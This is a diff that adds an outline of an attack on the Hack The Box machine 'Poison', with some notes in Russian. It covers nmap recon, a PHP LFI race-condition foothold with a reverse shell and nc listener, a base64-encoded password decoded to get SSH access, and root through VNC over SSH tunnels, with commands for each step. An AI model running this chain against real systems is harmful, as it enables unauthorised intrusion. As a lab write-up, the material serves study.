@@ -1,3 +1,37 @@
+POISON (HTB) — ATTACK CHAIN
+
+Reconnaissance
+├── nmap -sC -sV -A → 22 (OpenSSH 7.2 FreeBSD), 80 (Apache 2.4.29 FreeBSD PHP/5.6.32)
+└── / → "Temporary website to test local .php scripts"
+    └── Ссылки: ini.php, info.php, listfiles.php, phpinfo.php
+
+Foothold (LFI Race Condition)
+├── listfiles.php → pwdbackup.txt, browse.php
+├── phpinfo.php → file_uploads = On (tmp_name offset)
+├── phpinfolfi.py (PayloadsAllTheThings) → модификация:
+│   ├── LFIREQ: /browse.php?file=%s
+│   ├── payload: php reverse shell (pentest-monkey)
+│   └── fix bytes vs str (Python 3)
+├── nc -lnvp 9001
+└── python3 phpinfolfi.py 10.129.1.254 80 100 → www shell
+
+Lateral Movement (Credentials)
+├── /var/log/httpd-access.log (Apache access log path)
+├── /home/charix (permission denied)
+├── ps -aux → Xvnc :1 (root)
+├── /usr/local/www/apache24/data/pwdbackup.txt
+│   └── 13x base64 decode → Charix!2#4%6&8(0
+└── ssh charix@10.129.1.254 → user.txt (<USER_FLAG>)
+
+Privilege Escalation (VNC)
+├── ~/secret.zip → scp → unzip (pass: Charix!2#4%6&8(0)
+├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
+├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
+├── proxychains4.conf → socks5 127.0.0.1 1080
+└── vncviewer -passwd secret 127.0.0.1::6901 → root.txt (root flag)
+
+
+
 Initial: PHPInfo LFI Race Condition → reverse shell
 
 Root: Multiple base64 decode → SSH → VNC via tunneling → root
